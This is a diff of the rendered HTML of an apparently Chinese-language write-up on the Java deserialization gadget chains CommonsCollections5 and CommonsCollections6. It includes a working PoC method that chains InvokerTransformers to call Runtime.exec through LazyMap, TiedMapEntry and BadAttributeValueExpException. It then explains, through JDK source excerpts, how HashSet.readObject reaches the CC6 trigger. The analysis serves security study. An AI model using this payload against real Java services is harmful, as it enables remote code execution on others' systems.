+                <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Boolean<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            val <span style=color:#f92672>=</span> valObj<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span> <span style=color:#75715e>// the serialized object is from a version without JDK-8019292 fix
+</span><span style=color:#75715e></span>            val <span style=color:#f92672>=</span> System<span style=color:#f92672>.</span><span style=color:#a6e22e>identityHashCode</span><span style=color:#f92672>(</span>valObj<span style=color:#f92672>)</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;@&#34;</span> <span style=color:#f92672>+</span> valObj<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
 </code></pre></div><p>所以，这里只要设置val为TiedMapEntry对象，就可以在反序列化时触发LazyMap.get()方法，进而触发命令执行语句：</p>
-<pre tabindex="0"><code>TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);
+<pre tabindex=0><code>TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);
 
 BadAttributeValueExpException val = new BadAttributeValueExpException(null);
 Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
 valfield.setAccessible(true);
 valfield.set(val, entry);
 </code></pre><p>PoC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String commands<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// Init the transformer to exec commands.
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span>
-            <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-                    <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getMethod&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Class<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;getRuntime&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]}),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;invoke&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Object<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Object<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]}),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;exec&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]{</span>commands<span style="color:#f92672">}),</span>
-                    <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> HashSet<span style="color:#f92672">&lt;&gt;())</span>
-            <span style="color:#f92672">}</span>
-    <span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String commands<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// Init the transformer to exec commands.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>
+            <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span>commands<span style=color:#f92672>}),</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>&lt;&gt;())</span>
+            <span style=color:#f92672>}</span>
+    <span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// create lazyMap with transformer
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span>
-    <span style="color:#66d9ef">final</span> Map lazyMap <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span>innerMap<span style="color:#f92672">,</span> transformerChain<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// create lazyMap with transformer
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Map innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
+    <span style=color:#66d9ef>final</span> Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
 
-    TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry<span style="color:#f92672">(</span>lazyMap<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;foo&#34;</span><span style="color:#f92672">);</span>
+    TiedMapEntry entry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry<span style=color:#f92672>(</span>lazyMap<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;foo&#34;</span><span style=color:#f92672>);</span>
 
-    BadAttributeValueExpException val <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BadAttributeValueExpException<span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
-    Field valfield <span style="color:#f92672">=</span> val<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;val&#34;</span><span style="color:#f92672">);</span>
-    valfield<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-    valfield<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>val<span style="color:#f92672">,</span> entry<span style="color:#f92672">);</span>
+    BadAttributeValueExpException val <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BadAttributeValueExpException<span style=color:#f92672>(</span><span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
+    Field valfield <span style=color:#f92672>=</span> val<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;val&#34;</span><span style=color:#f92672>);</span>
+    valfield<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+    valfield<span style=color:#f92672>.</span><span style=color:#a6e22e>set</span><span style=color:#f92672>(</span>val<span style=color:#f92672>,</span> entry<span style=color:#f92672>);</span>
 
-    <span style="color:#66d9ef">return</span> val<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
-</code></pre></div><h2 id="commonscollections6">CommonsCollections6</h2>
+    <span style=color:#66d9ef>return</span> val<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><h2 id=commonscollections6>CommonsCollections6</h2>
 <p>CC6同样是换了一种方式来触发LazyMap.get，主要用到的是TiedMapEntry，其getValue方法会调用到这个方法。现在分析一下：</p>
 <p>首先定位到HashSet，最终，在其readObject方法内，会调用到一个map.put方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ObjectInputStream</span> s<span style="color:#f92672">)</span>
-    <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span><span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// Read in any hidden serialization magic
-</span><span style="color:#75715e"></span>    s<span style="color:#f92672">.</span><span style="color:#a6e22e">defaultReadObject</span><span style="color:#f92672">();</span>
-		<span style="color:#f92672">...</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ObjectInputStream</span> s<span style=color:#f92672>)</span>
+    <span style=color:#66d9ef>throws</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>IOException</span><span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// Read in any hidden serialization magic
+</span><span style=color:#75715e></span>    s<span style=color:#f92672>.</span><span style=color:#a6e22e>defaultReadObject</span><span style=color:#f92672>();</span>
+		<span style=color:#f92672>...</span>
 
-    <span style="color:#75715e">// Read in all elements in the proper order.
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span>0<span style="color:#f92672">;</span> i<span style="color:#f92672">&lt;</span>size<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
-        E e <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>E<span style="color:#f92672">)</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
-        map<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>e<span style="color:#f92672">,</span> PRESENT<span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#75715e>// Read in all elements in the proper order.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span>0<span style=color:#f92672>;</span> i<span style=color:#f92672>&lt;</span>size<span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
+        E e <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>E<span style=color:#f92672>)</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+        map<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>e<span style=color:#f92672>,</span> PRESENT<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>map是HashSet底层的HashMap，在其put方法中，会对key进行hash操作，具体来说会调用一个hash(key)方法，而这个方法内部又会调用一个key.hashcode方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>K key<span style="color:#f92672">,</span> V value<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>table <span style="color:#f92672">==</span> EMPTY_TABLE<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        inflateTable<span style="color:#f92672">(</span>threshold<span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
-        <span style="color:#66d9ef">return</span> putForNullKey<span style="color:#f92672">(</span>value<span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">int</span> hash <span style="color:#f92672">=</span> hash<span style="color:#f92672">(</span>key<span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> indexFor<span style="color:#f92672">(</span>hash<span style="color:#f92672">,</span> table<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Entry<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> e <span style="color:#f92672">=</span> table<span style="color:#f92672">[</span>i<span style="color:#f92672">];</span> e <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span> e <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        Object k<span style="color:#f92672">;</span>
-        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>e<span style="color:#f92672">.</span><span style="color:#a6e22e">hash</span> <span style="color:#f92672">==</span> hash <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">((</span>k <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">key</span><span style="color:#f92672">)</span> <span style="color:#f92672">==</span> key <span style="color:#f92672">||</span> key<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>k<span style="color:#f92672">)))</span> <span style="color:#f92672">{</span>
-            V oldValue <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">value</span><span style="color:#f92672">;</span>
-            e<span style="color:#f92672">.</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> value<span style="color:#f92672">;</span>
-            e<span style="color:#f92672">.</span><span style="color:#a6e22e">recordAccess</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">);</span>
-            <span style="color:#66d9ef">return</span> oldValue<span style="color:#f92672">;</span>
-        <span style="color:#f92672">}</span>
-    <span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> V <span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>K key<span style=color:#f92672>,</span> V value<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>table <span style=color:#f92672>==</span> EMPTY_TABLE<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        inflateTable<span style=color:#f92672>(</span>threshold<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>key <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+        <span style=color:#66d9ef>return</span> putForNullKey<span style=color:#f92672>(</span>value<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>int</span> hash <span style=color:#f92672>=</span> hash<span style=color:#f92672>(</span>key<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> indexFor<span style=color:#f92672>(</span>hash<span style=color:#f92672>,</span> table<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>Entry<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> table<span style=color:#f92672>[</span>i<span style=color:#f92672>];</span> e <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span> e <span style=color:#f92672>=</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        Object k<span style=color:#f92672>;</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>e<span style=color:#f92672>.</span><span style=color:#a6e22e>hash</span> <span style=color:#f92672>==</span> hash <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>((</span>k <span style=color:#f92672>=</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>key</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> key <span style=color:#f92672>||</span> key<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>k<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
+            V oldValue <span style=color:#f92672>=</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>value</span><span style=color:#f92672>;</span>
+            e<span style=color:#f92672>.</span><span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> value<span style=color:#f92672>;</span>
+            e<span style=color:#f92672>.</span><span style=color:#a6e22e>recordAccess</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>return</span> oldValue<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
 
-    modCount<span style="color:#f92672">++;</span>
-    addEntry<span style="color:#f92672">(</span>hash<span style="color:#f92672">,</span> key<span style="color:#f92672">,</span> value<span style="color:#f92672">,</span> i<span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
-<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span><span style="color:#f92672">(</span>Object k<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> hashSeed<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>0 <span style="color:#f92672">!=</span> h <span style="color:#f92672">&amp;&amp;</span> k <span style="color:#66d9ef">instanceof</span> String<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">return</span> sun<span style="color:#f92672">.</span><span style="color:#a6e22e">misc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Hashing</span><span style="color:#f92672">.</span><span style="color:#a6e22e">stringHash32</span><span style="color:#f92672">((</span>String<span style="color:#f92672">)</span> k<span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
+    modCount<span style=color:#f92672>++;</span>
+    addEntry<span style=color:#f92672>(</span>hash<span style=color:#f92672>,</span> key<span style=color:#f92672>,</span> value<span style=color:#f92672>,</span> i<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
+<span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hash</span><span style=color:#f92672>(</span>Object k<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>int</span> h <span style=color:#f92672>=</span> hashSeed<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>0 <span style=color:#f92672>!=</span> h <span style=color:#f92672>&amp;&amp;</span> k <span style=color:#66d9ef>instanceof</span> String<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> sun<span style=color:#f92672>.</span><span style=color:#a6e22e>misc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Hashing</span><span style=color:#f92672>.</span><span style=color:#a6e22e>stringHash32</span><span style=color:#f92672>((</span>String<span style=color:#f92672>)</span> k<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
 
-    h <span style="color:#f92672">^=</span> k<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">();</span>
+    h <span style=color:#f92672>^=</span> k<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>();</span>
 
-    <span style="color:#75715e">// This function ensures that hashCodes that differ only by
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// constant multiples at each bit position have a bounded
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// number of collisions (approximately 8 at default load factor).
-</span><span style="color:#75715e"></span>    h <span style="color:#f92672">^=</span> <span style="color:#f92672">(</span>h <span style="color:#f92672">&gt;&gt;&gt;</span> 20<span style="color:#f92672">)</span> <span style="color:#f92672">^</span> <span style="color:#f92672">(</span>h <span style="color:#f92672">&gt;&gt;&gt;</span> 12<span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">return</span> h <span style="color:#f92672">^</span> <span style="color:#f92672">(</span>h <span style="color:#f92672">&gt;&gt;&gt;</span> 7<span style="color:#f92672">)</span> <span style="color:#f92672">^</span> <span style="color:#f92672">(</span>h <span style="color:#f92672">&gt;&gt;&gt;</span> 4<span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#75715e>// This function ensures that hashCodes that differ only by
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// constant multiples at each bit position have a bounded
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// number of collisions (approximately 8 at default load factor).
+</span><span style=color:#75715e></span>    h <span style=color:#f92672>^=</span> <span style=color:#f92672>(</span>h <span style=color:#f92672>&gt;&gt;&gt;</span> 20<span style=color:#f92672>)</span> <span style=color:#f92672>^</span> <span style=color:#f92672>(</span>h <span style=color:#f92672>&gt;&gt;&gt;</span> 12<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>return</span> h <span style=color:#f92672>^</span> <span style=color:#f92672>(</span>h <span style=color:#f92672>&gt;&gt;&gt;</span> 7<span style=color:#f92672>)</span> <span style=color:#f92672>^</span> <span style=color:#f92672>(</span>h <span style=color:#f92672>&gt;&gt;&gt;</span> 4<span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>根据这里的参数调用，key其实是readObject中读取到的e，而根据writeObject方法，可以知道这个e其实来源于map的键：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// Write out all elements in the proper order.
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>E e <span style="color:#f92672">:</span>map<span style="color:#f92672">.</span><span style="color:#a6e22e">keySet</span><span style="color:#f92672">())</span>
-s<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#75715e>// Write out all elements in the proper order.
+</span><span style=color:#75715e></span><span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>E e <span style=color:#f92672>:</span>map<span style=color:#f92672>.</span><span style=color:#a6e22e>keySet</span><span style=color:#f92672>())</span>
+s<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
 </code></pre></div><p>所以说可以反射来设置这个键为我们想要的值，这个值会在hashcode方法中调用或间接LazyMap的get；CC6链中用到的依然是TiedMapEntry，这次用的就是它的hashcode方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    Object value <span style="color:#f92672">=</span> getValue<span style="color:#f92672">();</span>
-    <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>getKey<span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> 0 <span style="color:#f92672">:</span> getKey<span style="color:#f92672">().</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">())</span> <span style="color:#f92672">^</span>
-           <span style="color:#f92672">(</span>value <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> 0 <span style="color:#f92672">:</span> value<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">());</span> 
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+    Object value <span style=color:#f92672>=</span> getValue<span style=color:#f92672>();</span>
+    <span style=color:#66d9ef>return</span> <span style=color:#f92672>(</span>getKey<span style=color:#f92672>()</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> 0 <span style=color:#f92672>:</span> getKey<span style=color:#f92672>().</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>())</span> <span style=color:#f92672>^</span>
+           <span style=color:#f92672>(</span>value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> 0 <span style=color:#f92672>:</span> value<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>());</span> 
+<span style=color:#f92672>}</span>
 </code></pre></div><p>可以看到这里会调用getValue方法，而在CC5中就是通过toString调用getValue触发的LazyMap的get方法。这里也同样，调用getValue后就会触发TiedMapEntry中的lazyMap.get方法。</p>
 <p>简单总结一下这条链：</p>
 <ol>
@@ -385,160 +365,160 @@ s<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</sp
